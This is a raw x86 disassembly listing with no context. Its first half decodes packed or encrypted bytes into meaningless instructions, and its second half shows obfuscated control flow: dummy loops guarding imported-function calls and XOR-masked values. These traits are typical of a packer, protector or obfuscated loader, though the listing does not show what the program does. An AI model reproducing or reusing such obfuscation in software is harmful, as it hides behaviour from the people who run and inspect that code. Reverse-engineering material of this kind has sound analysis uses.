  411c94:	addr16 mov ch,0xb4
  411c97:	pop    ebp
  411c98:	cdq    
  411c99:	xor    cl,al
  411c9b:	push   cs
  411c9c:	in     eax,dx
  411c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c9e:	cdq    
  411c9f:	(bad)  
  411ca0:	loopne 0x411c64
  411ca2:	aaa    
  411ca3:	add    al,0x53
  411ca5:	fnstenv [esi-0x7e]
  411ca8:	fimul  WORD PTR [ecx-0x22518b6a]
  411cae:	add    DWORD PTR [ecx+ecx*8-0x2d],ebx
  411cb2:	inc    ecx
  411cb3:	dec    ebp
  411cb4:	call   FWORD PTR [ebp+0x6e739ab2]
  411cba:	push   edi
  411cbb:	jle    0x411c71
  411cbd:	pop    ebp
  411cbe:	mov    ?,eax
  411cc0:	rol    BYTE PTR [ecx+eiz*2],1
  411cc3:	scas   al,BYTE PTR es:[edi]
  411cc4:	jmp    0x411cc7
  411cc6:	mov    DWORD PTR [esi],ebp
  411cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cc9:	xor    BYTE PTR ds:0xb1816ee1,ah
  411ccf:	sub    dl,al
  411cd1:	inc    edi
  411cd2:	clc    
  411cd3:	addr16 add bh,ah
  411cd6:	sub    eax,0x14a5071d
  411cdb:	dec    esp
  411cdc:	jl     0x411ca4
  411cde:	retf   0x3b5a
  411ce1:	dec    esp
  411ce2:	adc    bh,BYTE PTR [edi+0x7c]
  411ce5:	push   edx
  411ce6:	sbb    edx,DWORD PTR [edi]
  411ce8:	lock cmp al,0x8e
  411ceb:	inc    ecx
  411cec:	mov    esi,0xb91c7f32
  411cf1:	add    eax,DWORD PTR [ebx+0x67]
  411cf4:	push   ecx
  411cf5:	jno    0x411d52
  411cf7:	jl     0x411ccb
  411cf9:	push   esp
  411cfa:	xor    al,0x63
  411cfc:	daa    
  411cfd:	test   DWORD PTR [edx+eiz*1],ebx
  411d00:	in     eax,0x5d
  411d02:	fwait
  411d03:	push   edi
  411d04:	scas   eax,DWORD PTR es:[edi]
  411d05:	inc    eax
  411d06:	arpl   bx,si
  411d08:	xlat   BYTE PTR ds:[ebx]
  411d09:	cmp    al,0xd0
  411d0b:	inc    edx
  411d0c:	jmp    0x411cbc
  411d0e:	mov    ecx,0x97ea3fac
  411d13:	or     al,0xf8
  411d15:	push   ss
  411d16:	mov    ah,0x55
  411d18:	aad    0x78
  411d1a:	iret   
  411d1b:	sar    esi,0x18
  411d1e:	sahf   
  411d1f:	(bad)  
  411d20:	dec    esi
  411d21:	mov    WORD PTR [esi],cs
  411d23:	mov    esp,0x5ffb326e
  411d28:	call   0x81346ab5
  411d2d:	fmul   QWORD PTR [ebx-0xf]
  411d30:	xor    BYTE PTR [ebp+ecx*1+0x495c4787],bh
  411d37:	mov    ah,0xa0
  411d39:	jnp    0x411d4e
  411d3b:	js     0x411d6a
  411d3d:	ss push eax
  411d3f:	ret    0xa13a
  411d42:	sbb    eax,DWORD PTR [ecx+0x29a49052]
  411d48:	xchg   edi,eax
  411d49:	ins    DWORD PTR es:[edi],dx
  411d4a:	xor    dl,BYTE PTR ds:[ecx-0x5c]
  411d4e:	outs   dx,DWORD PTR ds:[esi]
  411d4f:	mov    al,ds:0xf450cbb4
  411d54:	stos   DWORD PTR es:[edi],eax
  411d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d56:	cli    
  411d57:	jl     0x411da2
  411d59:	push   0x4afad9fd
  411d5e:	test   al,0xe1
  411d60:	xchg   edi,eax
  411d61:	pop    esp
  411d62:	pop    es
  411d63:	mov    WORD PTR [edi-0x16],ds
  411d66:	xor    al,0x4
  411d68:	outs   dx,BYTE PTR ds:[esi]
  411d69:	std    
  411d6a:	cld    
  411d6b:	inc    esi
  411d6c:	iret   
  411d6d:	push   ebx
  411d6e:	dec    esp
  411d6f:	ins    BYTE PTR es:[edi],dx
  411d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d71:	rcr    DWORD PTR [edi+0x16],cl
  411d74:	mov    bx,0x81ad
  411d78:	scas   al,BYTE PTR es:[edi]
  411d79:	std    
  411d7a:	push   es
  411d7b:	test   DWORD PTR [esi-0x50],ebp
  411d7e:	mov    esi,0xe15c000
  411d83:	ss sbb dh,cl
  411d86:	les    esi,FWORD PTR [edi+0x11]
  411d89:	mov    esp,0x9090e1b7
  411d8e:	stos   BYTE PTR es:[edi],al
  411d8f:	mov    ch,0xdc
  411d91:	sbb    dh,ch
  411d93:	sahf   
  411d94:	mov    eax,0x3df01dc5
  411d99:	hlt    
  411d9a:	pop    eax
  411d9b:	mov    ch,0x6e
  411d9d:	dec    esp
  411d9e:	or     BYTE PTR [esi],bl
  411da0:	mov    eax,0x809fa161
  411da5:	(bad)  
  411da6:	inc    ecx
  411da7:	in     al,0xea
  411da9:	pop    ds
  411daa:	push   eax
  411dab:	cmp    al,0x82
  411dad:	mov    al,ds:0x8ede26f1
  411db2:	push   0xc01c08e6
  411db7:	dec    edx
  411db8:	cli    
  411db9:	and    bl,BYTE PTR gs:[ecx]
  411dbc:	cmp    al,0x94
  411dbe:	push   0xa7062f9
  411dc3:	lods   al,BYTE PTR ds:[esi]
  411dc4:	jg     0x411e28
  411dc6:	std    
  411dc7:	test   al,0x3
  411dc9:	out    0x81,eax
  411dcb:	retf   0x8b39
  411dce:	pop    es
  411dcf:	sbb    DWORD PTR [ebp+0x1e],0xffffffb5
  411dd3:	xor    al,0x1c
  411dd5:	cwde   
  411dd6:	jle    0x411d5c
  411dd8:	push   esi
  411dd9:	cmp    ebp,DWORD PTR [esi]
  411ddb:	aam    0xcf
  411ddd:	bndstx [edx],(bad)
  411de0:	push   edi
  411de1:	push   esp
  411de2:	inc    ecx
  411de3:	ins    DWORD PTR es:[edi],dx
  411de4:	mov    ch,BYTE PTR [ebx+0x58903ceb]
  411dea:	jp     0x411d96
  411dec:	fld    DWORD PTR [esi+ebx*2+0x19]
  411df0:	mov    dl,0xe7
  411df2:	fadd   QWORD PTR [bx-0x3b]
  411df6:	xchg   dl,al
  411df8:	cmc    
  411df9:	outs   dx,DWORD PTR ds:[esi]
  411dfa:	adc    DWORD PTR [ebx],edx
  411dfc:	inc    esp
  411dfd:	outs   dx,DWORD PTR ds:[esi]
  411dfe:	pop    ss
  411dff:	add    ebx,DWORD PTR [edi-0x11]
  411e02:	call   0xc77a2fed
  411e07:	or     DWORD PTR ds:0xdde11d4e,ebx
  411e0d:	cmp    ch,dh
  411e0f:	pop    ebp
  411e10:	ss in  al,dx
  411e12:	or     al,0x2b
  411e14:	xor    al,0x13
  411e16:	pop    edx
  411e17:	sub    ecx,esp
  411e19:	(bad)  
  411e1a:	cs in  eax,0xfb
  411e1d:	add    dh,BYTE PTR [ecx-0x70]
  411e20:	pop    edi
  411e21:	mov    al,ds:0x9ce119b7
  411e26:	out    0x77,al
  411e28:	pop    esi
  411e29:	jo     0x411e32
  411e2b:	and    ecx,DWORD PTR [ecx+0x73b959a9]
  411e31:	add    ecx,DWORD PTR [edx]
  411e33:	leave  
  411e34:	mov    cl,0x91
  411e36:	out    0x60,eax
  411e38:	stos   BYTE PTR es:[edi],al
  411e39:	sub    ecx,DWORD PTR [ebx-0x44]
  411e3c:	dec    ebp
  411e3d:	mov    ecx,ebp
  411e3f:	int3   
  411e40:	dec    ebp
  411e41:	adc    eax,0x252f086e
  411e46:	fcomp  DWORD PTR [ebp+0x49171669]
  411e4c:	scas   al,BYTE PTR es:[edi]
  411e4d:	fiadd  WORD PTR [ecx+0x6ebf2684]
  411e53:	lock mov al,0x6d
  411e56:	sub    ebx,ebx
  411e58:	push   esp
  411e59:	sbb    al,0xe
  411e5b:	dec    esi
  411e5c:	and    eax,0xd02ce56b
  411e61:	imul   BYTE PTR [esp+edx*1]
  411e64:	out    dx,al
  411e65:	push   edi
  411e66:	stc    
  411e67:	ins    DWORD PTR es:[edi],dx
  411e68:	lahf   
  411e69:	inc    ebx
  411e6a:	aas    
  411e6b:	mov    ebp,0xbfebadd9
  411e70:	test   eax,0xb2d3c12
  411e75:	int3   
  411e76:	xor    ah,bh
  411e78:	xor    DWORD PTR [esi],0xfffffff5
  411e7b:	sub    BYTE PTR [eax-0x1d41efdd],al
  411e81:	pop    eax
  411e82:	dec    ebx
  411e83:	(bad)  
  411e84:	fild   WORD PTR [ebx-0x3cf51712]
  411e8a:	sbb    esp,DWORD PTR [eax]
  411e8c:	outs   dx,BYTE PTR ds:[esi]
  411e8d:	pop    ebx
  411e8e:	sbb    edx,DWORD PTR ds:0x7e88a3b3
  411e94:	retf   0x3eb2
  411e97:	sub    ebx,DWORD PTR [eax]
  411e99:	shr    BYTE PTR [edi-0x562a1bb7],0xb
  411ea0:	call   0x5493:0xd9e228b0
  411ea7:	and    al,0x9
  411ea9:	(bad)  
  411eaa:	jmp    0x411ebe
  411eac:	mov    cl,0xff
  411eae:	xchg   edi,eax
  411eaf:	mov    eax,ds:0xb07273ab
  411eb4:	or     bh,BYTE PTR [esi-0x1e]
  411eb7:	push   ebx
  411eb8:	jle    0x411ea5
  411eba:	mov    esi,0x48c48764
  411ebf:	mov    bl,0xf5
  411ec1:	xchg   DWORD PTR [esi-0x61],ecx
  411ec4:	scas   al,BYTE PTR es:[edi]
  411ec5:	sub    eax,0x45b937eb
  411eca:	xchg   ecx,eax
  411ecb:	jp     0x411f4b
  411ecd:	loopne 0x411e91
  411ecf:	mov    dh,0xf2
  411ed1:	add    BYTE PTR [edx+0x42],ch
  411ed4:	lar    eax,WORD PTR [eax]
  411ed7:	out    0xb,eax
  411ed9:	cmp    bh,BYTE PTR [edi-0x4bb999a4]
  411edf:	xor    BYTE PTR [edi-0xf0272db],bh
  411ee5:	or     BYTE PTR [edx+0x57dc5555],0xa2
  411eec:	in     eax,0x1b
  411eee:	mov    cl,0x40
  411ef0:	ins    BYTE PTR es:[edi],dx
  411ef1:	dec    esp
  411ef2:	mov    eax,ds:0xe9a39037
  411ef7:	lods   al,BYTE PTR ds:[esi]
  411ef8:	les    esi,FWORD PTR [eax+ecx*1-0x67]
  411efc:	add    DWORD PTR [ebx+edi*4-0x48c44f41],0x3864e6ea
  411f07:	adc    bh,bh
  411f09:	int3   
  411f0a:	in     al,dx
  411f0b:	into   
  411f0c:	jno    0x411ead
  411f0e:	xor    dh,BYTE PTR [esp+edi*8-0x247c5593]
  411f15:	sub    al,0x84
  411f17:	jne    0x411f18
  411f19:	xor    esp,DWORD PTR [eax+0x4a6207ca]
  411f1f:	ret    0xa80e
  411f22:	dec    ebx
  411f23:	dec    esi
  411f24:	lock sbb BYTE PTR [edi-0x7a89cfb6],bl
  411f2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f2c:	retf   0xb3db
  411f2f:	mov    esp,0x2ab8ed3
  411f34:	cmp    eax,0xc8579b6b
  411f39:	repnz out dx,eax
  411f3b:	nop
  411f3c:	aaa    
  411f3d:	lods   eax,DWORD PTR ds:[esi]
  411f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f3f:	adc    edx,DWORD PTR [esi+0x29]
  411f42:	mov    eax,ds:0xc9404b91
  411f47:	in     eax,0xed
  411f49:	inc    ebx
  411f4a:	not    esi
  411f4c:	lods   al,BYTE PTR ds:[esi]
  411f4d:	out    dx,eax
  411f4e:	jl     0x411f4d
  411f50:	fmul   st(6),st
  411f52:	(bad)  
  411f53:	cmp    BYTE PTR [edi-0x36],bh
  411f56:	lock rcr DWORD PTR [ecx],1
  411f59:	icebp  
  411f5a:	xchg   ecx,eax
  411f5b:	ret    
  411f5c:	mov    dl,0x47
  411f5e:	repnz or BYTE PTR [esi+0x26],ah
  411f62:	ins    DWORD PTR es:[edi],dx
  411f63:	pusha  
  411f64:	push   es
  411f65:	xchg   BYTE PTR [esi],bl
  411f67:	mov    gs,WORD PTR [ebx-0x73e7892f]
  411f6d:	cli    
  411f6e:	or     ah,cl
  411f70:	push   ds
  411f71:	sar    DWORD PTR [edi],cl
  411f73:	loop   0x411eff
  411f75:	mov    al,ds:0x5e403a95
  411f7a:	sbb    DWORD PTR [ebx+0x2ca7dfbb],0x7880cdb
  411f84:	test   DWORD PTR [ebx-0x31981305],edi
  411f8a:	int    0x6d
  411f8c:	enter  0x8764,0xe0
  411f90:	out    0xa7,al
  411f92:	bound  edx,QWORD PTR [ebx]
  411f94:	cld    
  411f95:	cmp    bl,0x7e
  411f98:	test   BYTE PTR [ebp-0x325e0e07],dh
  411f9e:	jge    0x411f43
  411fa0:	jmp    0x2562679f
  411fa5:	shl    DWORD PTR [ebp+0x7379a16],0xe3
  411fac:	add    cl,BYTE PTR [esi-0x2b]
  411faf:	lock inc ecx
  411fb1:	retf   
  411fb2:	lock mov bh,0x43
  411fb5:	or     BYTE PTR [ebp-0x7048da08],0xc2
  411fbc:	fadd   st,st(1)
  411fbe:	add    BYTE PTR [esp+ebx*4+0x54930e22],dl
  411fc5:	je     0x412046
  411fc7:	adc    bh,ch
  411fc9:	jl     0x411fc5
  411fcb:	inc    ecx
  411fcc:	cld    
  411fcd:	adc    esi,DWORD PTR [ecx]
  411fcf:	cmc    
  411fd0:	mov    esi,0x30f67cd3
  411fd5:	and    BYTE PTR [esi+0x7b],ch
  411fd8:	dec    edx
  411fd9:	cmp    BYTE PTR [ebx],ah
  411fdb:	cmc    
  411fdc:	retf   
  411fdd:	dec    eax
  411fde:	loopne 0x411f77
  411fe0:	xchg   ebp,eax
  411fe1:	lods   al,BYTE PTR ds:[esi]
  411fe2:	adc    BYTE PTR [esi+0x6cd4f2f4],dl
  411fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe9:	les    esi,FWORD PTR [ecx-0x78]
  411fec:	push   es
  411fed:	rcl    DWORD PTR [eax+0x2912a571],0x5a
  411ff4:	adc    BYTE PTR [edi+0x28],ah
  411ff7:	pop    esi
  411ff8:	dec    edi
  411ff9:	add    eax,0x8af7ef67
  411ffe:	jb     0x411fce
  412000:	arpl   WORD PTR [edi+0x39],di
  412003:	adc    al,0x99
  412005:	xchg   ebp,eax
  412006:	mov    esi,DWORD PTR [ecx+0x2a]
  412009:	or     al,0xbd
  41200b:	jne    0x411f9e
  41200d:	xchg   edx,eax
  41200e:	outs   dx,BYTE PTR ds:[esi]
  41200f:	add    eax,0xeed32ff6
  412014:	cli    
  412015:	fidivr DWORD PTR [esi]
  412017:	xor    eax,ebp
  412019:	retf   0xf3ce
  41201c:	in     al,dx
  41201d:	shr    BYTE PTR [ebx-0x624157be],cl
  412023:	imul   ebx,ecx,0x73
  412026:	xor    al,0x13
  412028:	push   ebx
  412029:	sub    ah,dl
  41202b:	adc    DWORD PTR [edi-0x1b],eax
  41202e:	inc    ecx
  41202f:	inc    edx
  412030:	mov    eax,ds:0x17ae59f9
  412035:	aaa    
  412036:	cmc    
  412037:	xchg   ebp,eax
  412038:	adc    al,0x7f
  41203a:	mov    bh,BYTE PTR [edx]
  41203c:	or     bl,BYTE PTR [edx+0x7ae9b57d]
  412042:	fild   QWORD PTR [eax]
  412044:	mov    dl,0x7
  412046:	mov    dl,0xf0
  412048:	xor    bl,BYTE PTR [eax+0x8]
  41204b:	in     al,dx
  41204c:	push   0x571cd873
  412051:	jnp    0x4120ad
  412053:	push   es
  412054:	cld    
  412055:	stos   BYTE PTR es:[edi],al
  412056:	xchg   BYTE PTR [ecx+0x6499efcd],bh
  41205c:	inc    edi
  41205d:	std    
  41205e:	mov    bl,0x8b
  412060:	shr    bh,0x9c
  412063:	push   eax
  412064:	pop    ecx
  412065:	out    dx,al
  412066:	sbb    DWORD PTR [ecx+0x5f],eax
  412069:	xor    al,0x39
  41206b:	xchg   esp,eax
  41206c:	and    BYTE PTR [esi+0x316d43fa],al
  412072:	adc    al,0xfa
  412074:	jle    0x4120aa
  412076:	outs   dx,DWORD PTR ds:[esi]
  412077:	or     edx,DWORD PTR [edi-0x585c1d8a]
  41207d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41207e:	sbb    al,0x86
  412080:	repz push ds
  412082:	jns    0x41207f
  412084:	and    bl,BYTE PTR [ebx-0x41]
  412087:	sub    DWORD PTR [edi-0xad683e5],esi
  41208d:	xchg   ecx,eax
  41208e:	scas   al,BYTE PTR es:[edi]
  41208f:	cmp    BYTE PTR [ebx+0x12],dh
  412092:	fdivr  DWORD PTR [esp+edi*8]
  412095:	pop    ebp
  412096:	data16 mov BYTE PTR [esi-0x28235811],bh
  41209d:	call   ebx
  41209f:	xchg   BYTE PTR [ecx-0x58980c0a],dh
  4120a5:	sar    cl,cl
  4120a7:	ds pop es
  4120a9:	gs psubusw mm7,mm6
  4120ad:	bound  ebp,QWORD PTR [ebp+0x7c9c618f]
  4120b3:	sti    
  4120b4:	sub    ch,bh
  4120b6:	xchg   ah,bl
  4120b8:	jle    0x4120b0
  4120ba:	int    0xb5
  4120bc:	sar    DWORD PTR gs:[esi-0x37b0abc8],1
  4120c3:	sbb    al,0x89
  4120c5:	lds    ebp,FWORD PTR [edx]
  4120c7:	mov    ebx,0xfaa9c2c3
  4120cc:	mov    esp,0x5d9e1a87
  4120d1:	pop    es
  4120d2:	xor    eax,0xf24d6b9a
  4120d7:	in     eax,0x98
  4120d9:	rcr    DWORD PTR [edi],cl
  4120db:	into   
  4120dc:	pop    ebx
  4120dd:	inc    ebx
  4120de:	out    dx,eax
  4120df:	push   ss
  4120e0:	sub    ah,ah
  4120e2:	loop   0x41206e
  4120e4:	and    BYTE PTR [eax+0x42],ch
  4120e7:	jne    0x41208f
  4120e9:	mov    DWORD PTR [esi-0x21],ebp
  4120ec:	inc    esp
  4120ed:	xor    bl,BYTE PTR [ebx-0x63]
  4120f0:	push   esp
  4120f1:	push   DWORD PTR [edi]
  4120f3:	cwde   
  4120f4:	inc    eax
  4120f5:	push   esi
  4120f6:	js     0x412149
  4120f8:	push   esp
  4120f9:	(bad)  
  4120fa:	dec    esi
  4120fb:	mov    dh,0xc4
  4120fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120fe:	aam    0x44
  412100:	sbb    eax,0x65db2aee
  412105:	aam    0xbf
  412107:	cs and al,0xdb
  41210a:	xor    DWORD PTR [ecx],0x68a70510
  412110:	sbb    DWORD PTR [esi-0x2],ecx
  412113:	mov    ah,0x51
  412115:	dec    esp
  412116:	jbe    0x412167
  412118:	retf   0xcad1
  41211b:	mov    dh,0xa
  41211d:	inc    edi
  41211e:	(bad)  
  412120:	retf   
  412121:	push   cs
  412122:	xor    al,0x9b
  412124:	shl    DWORD PTR ds:0x81ae2f0,1
  41212a:	or     DWORD PTR [eax+0x2d],edi
  41212d:	stos   DWORD PTR es:[edi],eax
  41212e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41212f:	(bad)  
  412130:	(bad)  
  412131:	xchg   edx,eax
  412132:	fild   QWORD PTR [esi-0x531c277f]
  412138:	icebp  
  412139:	lock jmp 0x412111
  41213c:	sbb    BYTE PTR [ebx-0x51f5b46f],bh
  412142:	repz xor eax,0x56b60080
  412148:	mov    DWORD PTR [ebp-0x50],edx
  41214b:	adc    ebx,ebx
  41214d:	mov    edx,DWORD PTR [ebp+0x8]
  412150:	and    DWORD PTR ds:0x428e8d,0x0
  41215a:	jmp    0x41216c
  41215f:	mov    ebx,DWORD PTR ds:0x428e8d
  412165:	inc    ebx
  412166:	mov    DWORD PTR ds:0x428e8d,ebx
  41216c:	cmp    DWORD PTR ds:0x428e8d,0x1c
  412173:	jae    0x4121a0
  412179:	cmp    DWORD PTR ds:0x428e8d,0x20
  412180:	ja     0x4121a0
  412186:	jmp    0x41219b
  41218b:	push   0x428039
  412190:	push   0x400000
  412195:	call   DWORD PTR ds:0x42ca24
  41219b:	jmp    0x41215f
  4121a0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4121a3:	inc    DWORD PTR ds:0x428e71
  4121a9:	add    edx,ecx
  4121ab:	sbb    DWORD PTR ds:0x428e8d,0x5a59
  4121b5:	or     edx,ebx
  4121b7:	mov    DWORD PTR ds:0x428e55,0x19
  4121c1:	cmp    DWORD PTR ds:0x428e55,0x0
  4121c8:	je     0x4121fb
  4121ce:	cmp    DWORD PTR ds:0x428e55,0x1e
  4121d5:	jle    0x4121fb
  4121db:	jmp    0x4121e9
  4121e0:	push   DWORD PTR [ebp-0x20]
  4121e3:	call   DWORD PTR ds:0x42ca28
  4121e9:	mov    ebx,DWORD PTR ds:0x428e55
  4121ef:	dec    ebx
  4121f0:	mov    DWORD PTR ds:0x428e55,ebx
  4121f6:	jmp    0x4121c1
  4121fb:	mov    DWORD PTR [ebp-0x4c],edx
  4121fe:	add    DWORD PTR ds:0x428eb1,ebx
  412204:	mov    edx,DWORD PTR [ebp+0x8]
  412207:	mov    DWORD PTR ds:0x428ec5,0x16
  412211:	cmp    DWORD PTR ds:0x428ec5,0x0
  412218:	je     0x412267
  41221e:	cmp    DWORD PTR ds:0x428ec5,0xc
  412225:	jl     0x412267
  41222b:	jmp    0x41223b
  412230:	push   0x1fc5
  412235:	call   DWORD PTR ds:0x42ca2c
  41223b:	cmp    DWORD PTR ds:0x428ec5,0xd
  412242:	jne    0x412255
  412248:	mov    ebx,DWORD PTR ds:0x428ec5
  41224e:	dec    ebx
  41224f:	mov    DWORD PTR ds:0x428ec5,ebx
  412255:	mov    ebx,DWORD PTR ds:0x428ec5
  41225b:	dec    ebx
  41225c:	mov    DWORD PTR ds:0x428ec5,ebx
  412262:	jmp    0x412211
  412267:	mov    ebx,0xfdbe0321
  41226c:	add    DWORD PTR ds:0x428eb9,0x428e39
  412276:	sub    ebx,edx
  412278:	add    ebx,DWORD PTR [ebp-0x48]
  41227b:	sbb    edx,DWORD PTR ds:0x428e75
  412281:	mov    DWORD PTR [ebp-0x48],ebx
  412284:	xor    DWORD PTR ds:0x428e9d,edi
  41228a:	mov    edx,DWORD PTR [ebp+0x8]
  41228d:	mov    ebx,DWORD PTR ds:0x428e35
  412293:	sub    DWORD PTR ds:0x428e4d,ebx
  412299:	mov    ebx,DWORD PTR [ebp-0x44]
  41229c:	add    edx,edi
  41229e:	xor    DWORD PTR ds:0x428e7d,0x7f21
  4122a8:	xor    edx,ebx
  4122aa:	mov    DWORD PTR [ebp-0x44],edx
  4122ad:	movzx  edx,BYTE PTR ds:0x428e9d
  4122b4:	adc    DWORD PTR ds:0x428e65,edx
  4122ba:	mov    edx,DWORD PTR [ebp+0x8]
  4122bd:	xor    DWORD PTR ds:0x428e55,0x428ead
  4122c7:	xor    edx,eax
  4122c9:	add    edx,esi
  4122cb:	mov    DWORD PTR ds:0x428e95,0x7e15
  4122d5:	jne    0x40fc55
  4122db:	jmp    0x412616
  4122e0:	mov    edx,DWORD PTR [ebp-0xc]
  4122e3:	inc    ebx
  4122e4:	sub    edx,esi
  4122e6:	movzx  ebx,BYTE PTR ds:0x428ebd
  4122ed:	xor    DWORD PTR ds:0x428ec5,ebx
  4122f3:	xor    edx,eax
  4122f5:	mov    DWORD PTR ds:0x428e31,0x17
  4122ff:	cmp    DWORD PTR ds:0x428e31,0x0
  412306:	je     0x412355
  41230c:	cmp    DWORD PTR ds:0x428e31,0xa
  412313:	jle    0x412355
  412319:	jmp    0x412329
  41231e:	push   0x428059
  412323:	call   DWORD PTR ds:0x42ca30
  412329:	cmp    DWORD PTR ds:0x428e31,0xb
  412330:	jne    0x412343
  412336:	mov    ebx,DWORD PTR ds:0x428e31
  41233c:	dec    ebx
  41233d:	mov    DWORD PTR ds:0x428e31,ebx
  412343:	mov    ebx,DWORD PTR ds:0x428e31
  412349:	dec    ebx
  41234a:	mov    DWORD PTR ds:0x428e31,ebx
  412350:	jmp    0x4122ff
  412355:	mov    DWORD PTR [ebp-0x5c],edx
  412358:	mov    edx,DWORD PTR [ebp-0x10]
  41235b:	mov    ebx,DWORD PTR [ebp-0x8]
  41235e:	xor    DWORD PTR ds:0x428e99,0xf1a
  412368:	xor    edx,eax
  41236a:	xor    ebx,eax
  41236c:	sub    DWORD PTR ds:0x428ebd,0x1998
  412376:	sub    edx,ebx
  412378:	sub    edx,esi
  41237a:	xor    edx,eax
  41237c:	mov    DWORD PTR [ebp-0x10],edx
  41237f:	mov    edx,DWORD PTR [ebp-0x14]
  412382:	mov    DWORD PTR [ebp+0x8],edx
  412385:	jmp    0x4123fa
  41238a:	mov    edx,DWORD PTR [ebp+0x8]
  41238d:	mov    ebx,DWORD PTR [ebp-0x8]
  412390:	xor    edx,eax
  412392:	xor    ebx,eax
  412394:	sub    edx,ebx
  412396:	sub    edx,esi
  412398:	xor    edx,eax
  41239a:	mov    DWORD PTR [ebp+0x8],edx
  41239d:	mov    edx,DWORD PTR [ebp+0x8]
  4123a0:	mov    ebx,DWORD PTR [ebp-0x58]
  4123a3:	lea    edx,[ebx+edx*1+0x5708f8]
  4123aa:	mov    DWORD PTR [ebp-0x58],edx
  4123ad:	mov    edx,DWORD PTR [ebp+0x8]
  4123b0:	mov    ebx,DWORD PTR [ebp-0x54]
  4123b3:	add    edx,0x64f89a
  4123b9:	imul   edx,ebx
  4123bc:	mov    DWORD PTR [ebp-0x54],edx
  4123bf:	mov    edx,DWORD PTR [ebp+0x8]
  4123c2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123c5:	add    edx,0x242ebed
  4123cb:	and    edx,ebx
  4123cd:	mov    DWORD PTR [ebp-0x50],edx
  4123d0:	mov    edx,DWORD PTR [ebp+0x8]
  4123d3:	mov    ebx,DWORD PTR [ebp-0x4c]
  4123d6:	add    edx,ecx
  4123d8:	or     edx,ebx
  4123da:	mov    DWORD PTR [ebp-0x4c],edx
  4123dd:	mov    edx,DWORD PTR [ebp+0x8]
  4123e0:	mov    ebx,0xfdbe0321
  4123e5:	sub    ebx,edx
  4123e7:	add    ebx,DWORD PTR [ebp-0x48]
  4123ea:	mov    DWORD PTR [ebp-0x48],ebx
  4123ed:	mov    edx,DWORD PTR [ebp+0x8]
  4123f0:	mov    ebx,DWORD PTR [ebp-0x44]
  4123f3:	add    edx,edi
  4123f5:	xor    edx,ebx
  4123f7:	mov    DWORD PTR [ebp-0x44],edx
  4123fa:	mov    edx,DWORD PTR [ebp+0x8]
  4123fd:	xor    edx,eax
  4123ff:	add    edx,esi
  412401:	jne    0x41238a
  412407:	mov    edx,DWORD PTR [ebp-0xc]
  41240a:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  412411:	mov    bl,BYTE PTR [ebp-0x1]
  412414:	cmp    dl,bl
  412416:	je     0x4124f4
  41241c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41241f:	mov    edx,DWORD PTR [ebp-0xc]
  412422:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  412429:	mov    ebx,DWORD PTR [ebp+0xc]
  41242c:	xor    ecx,eax
  41242e:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f8]
  412435:	jne    0x412628
  41243b:	mov    ecx,DWORD PTR [ebp-0x5c]
  41243e:	mov    edx,DWORD PTR [ebp+0xc]
  412441:	xor    ecx,eax
  412443:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f8]
  41244b:	mov    edx,DWORD PTR [ebp-0x18]
  41244e:	xor    edx,eax
  412450:	add    edx,esi
  412452:	cmp    ecx,edx
  412454:	mov    ecx,DWORD PTR [ebp-0x14]
  412457:	mov    DWORD PTR [ebp+0x8],ecx
  41245a:	mov    ecx,DWORD PTR [ebp+0x8]
  41245d:	je     0x414aa9
  412463:	xor    ecx,eax
  412465:	add    ecx,esi
  412467:	mov    ecx,0xf641bea
  41246c:	je     0x41257c
  412472:	mov    edx,DWORD PTR [ebp+0x8]
  412475:	mov    ebx,DWORD PTR [ebp-0x8]
  412478:	xor    edx,eax
  41247a:	xor    ebx,eax
  41247c:	sub    edx,ebx
  41247e:	sub    edx,esi
  412480:	xor    edx,eax
  412482:	mov    DWORD PTR [ebp+0x8],edx
  412485:	mov    edx,DWORD PTR [ebp+0x8]
  412488:	mov    ebx,DWORD PTR [ebp-0x58]
  41248b:	lea    edx,[ebx+edx*1+0x5708f8]
  412492:	mov    DWORD PTR [ebp-0x58],edx
  412495:	mov    edx,DWORD PTR [ebp+0x8]
  412498:	mov    ebx,DWORD PTR [ebp-0x54]
  41249b:	add    edx,0x64f89a
  4124a1:	imul   edx,ebx
  4124a4:	mov    DWORD PTR [ebp-0x54],edx
  4124a7:	mov    edx,DWORD PTR [ebp+0x8]
  4124aa:	mov    ebx,DWORD PTR [ebp-0x50]
  4124ad:	add    edx,0x242ebed
  4124b3:	and    edx,ebx
  4124b5:	mov    DWORD PTR [ebp-0x50],edx
  4124b8:	mov    edx,DWORD PTR [ebp+0x8]
  4124bb:	mov    ebx,DWORD PTR [ebp-0x4c]
  4124be:	add    edx,ecx
  4124c0:	or     edx,ebx
  4124c2:	mov    DWORD PTR [ebp-0x4c],edx
  4124c5:	mov    edx,DWORD PTR [ebp+0x8]
  4124c8:	mov    ebx,0xfdbe0321
  4124cd:	sub    ebx,edx
  4124cf:	add    ebx,DWORD PTR [ebp-0x48]
  4124d2:	mov    DWORD PTR [ebp-0x48],ebx
  4124d5:	mov    edx,DWORD PTR [ebp+0x8]
  4124d8:	mov    ebx,DWORD PTR [ebp-0x44]
  4124db:	add    edx,edi
  4124dd:	xor    edx,ebx
  4124df:	mov    DWORD PTR [ebp-0x44],edx
  4124e2:	mov    edx,DWORD PTR [ebp+0x8]
  4124e5:	xor    edx,eax
  4124e7:	add    edx,esi
  4124e9:	jne    0x412472
  4124ef:	jmp    0x41257c
  4124f4:	mov    edx,DWORD PTR [ebp-0x14]
  4124f7:	mov    DWORD PTR [ebp+0x8],edx
  4124fa:	jmp    0x41256f
  4124ff:	mov    edx,DWORD PTR [ebp+0x8]
